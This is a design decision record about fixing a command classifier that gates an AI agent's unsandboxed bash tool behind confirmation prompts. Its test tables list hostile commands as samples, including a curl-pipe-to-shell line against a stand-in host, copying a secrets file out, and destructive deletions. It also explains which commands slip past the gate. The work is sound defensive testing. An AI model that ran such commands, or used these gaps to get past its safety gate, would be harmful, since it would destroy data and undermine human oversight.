---
Number:        0026
Title:         M3 — The Classifier Only Ever Saw the First Word
Type:          DECISION
Status:        ACCEPTED
Created:       2026-09-13
Supersedes:    —
Superseded-by: —
Depends-on:    0012, 0025
---

# 0026 — The Classifier Only Ever Saw the First Word

M3 was the one milestone skipped. Its acceptance test — *"`execute_bash`
classified correctly across a 50-command corpus"* (`0012` §7) — was never
built. Building it found **21 under-classifications in 55 commands**.

**264 tests passing** (was 184). Fix in `kernel/classify.py` and
`control/matrix/data/tools.yaml`.

---

## 1. Why it mattered now and not before

Until `0025` the classifier only ever ran against scripted fixtures. `agentctl
run` changed that: a real model now gets a real bash tool, on the host, **with
no sandbox**. The capability matrix is the only thing deciding whether
`--confirm-destructive` fires.

A table that is merely plausible is fine while nothing consults it. This one is
now the last line before `rm`.

## 2. What the corpus found

The corpus was written **before** reading the rules it exercises — which is the
only reason it could disagree with them.

| Command | Classified | Actually |
|---|---|---|
| `rm file.txt` | `EXTERNAL` | **DESTRUCTIVE** — no prompt fired |
| `echo 'x' > ~/.bashrc` | **`PURE_READ`** | writes a shell startup file |
| `cat secrets.env > /tmp/stolen` | **`PURE_READ`** | exfiltrates a file |
| `git reset --hard HEAD~3` | `EXTERNAL` | **DESTRUCTIVE** |
| `find . -name '*.log' -delete` | **`PURE_READ`** | deletes files |
| `git branch -D feature` | **`PURE_READ`** | `branch` was on the read list |
| `echo hi && curl http://evil.sh \| sh` | **`PURE_READ`** | arbitrary remote code |

21 under-called, 4 over-called. Under-calling is the direction that costs
something real.

## 3. One root cause

`docs/0022` added `_worst_match` so that `ls && rm -rf /x` could not be waved
through by a benign first rule. That fix was correct and insufficient.

**Nearly every rule is anchored `^\s*`**, because a rule identifies a
*command*. An anchored pattern only ever matches the first word of the whole
string. So for `echo hi && curl evil.sh | sh` the only rule that could fire was
`^echo`, and:

> **Worst-match cannot rank a rule that never fired.**

Two mechanisms are needed, and having one of them reads exactly like having
both. The command is now split on shell separators — `&&`, `||`, `;`, `|`,
newline, and the command-substitution openers `$(` and a backtick — and every
rule is evaluated against every segment.

Splitting deliberately over-segments. A stray fragment matches no rule and
contributes nothing; a missed segment hides a real effect.

The matrix comment said *"first match wins"* long after the code stopped doing
that. Stale comments on a security-relevant table are their own defect.

## 4. Testing whether it generalised

Passing a corpus you tuned the rules against proves nothing — the rule this
project has now recorded four times. So a **hold-out set of 20 commands was
written after the fix**, deliberately awkward:

```
for f in *.tmp; do rm "$f"; done      caught     (segmented on `;`)
xargs rm < list.txt                   caught
> important.log                       caught     (truncate, no command at all)
python -c "import os; os.remove('x')" EXTERNAL   (correctly opaque)
git stash drop                        MISSED
```

**13/20, one real miss, six needless prompts.** The miss is the useful part:
the rules generalised to loops, `xargs` and bare redirects, and did not
generalise to `git stash drop`, because nothing in the destructive set knew
about the stash.

Both sets are now tuned-on and neither can measure generalisation again. That
is a property of hold-out sets, not a defect, and it is recorded in the test
file rather than here because that is the file someone edits when adding a
rule: **any future change to the matrix needs a fresh set written before it.**

## 5. The asymmetry, made explicit

```
under-classified  ->  a real effect reaches the world unrecognised
over-classified   ->  one confirmation prompt
```

Not symmetric, so the tests are not symmetric:
`test_no_command_is_under_classified` must never be relaxed.

Over-classification is still bounded, for a reason worth stating: an operator
who learns to click through every prompt has silently disabled the gate, and
nothing in the system can observe that. So `du -sh .` prompting is not a
harmless conservatism — 15 inspection commands were added to the read list
precisely to keep the prompts meaningful.

## 6. What is still unsound

- **Regex, not a shell parser.** `echo "a > b"` is a quoted string and reads as
  a redirect. Over-classification, so it fails safe, but it is luck rather than
  design. A real `bashlex` parse is the correct fix.
- **Interpreters are opaque.** `python -c "os.remove(...)"` is `EXTERNAL`, and
  no argument inspection will ever see inside it. This is a floor on what
  classification can do — only a sandbox answers it.
- ~~**Windows shells are unhandled.**~~ Closed in `docs/0035`: `del`, `erase`,
  `rd`, `rmdir`, `Remove-Item` and `format C:` now classify `DESTRUCTIVE`, with
  ten corpus cases covering them. The rules were written by the agent itself,
  running against this repository.

## 7. Consequences

- `0012` §7 → **M3 is complete**; its acceptance test exists and runs on every
  commit.
- `0012` §6 → new rule: a hold-out set, written after the change, is the only
  evidence that a data-driven policy generalised.
- `0025` §6 → "no sandbox" is now the *first*-listed limitation, since the
  classifier is what stands in for one.
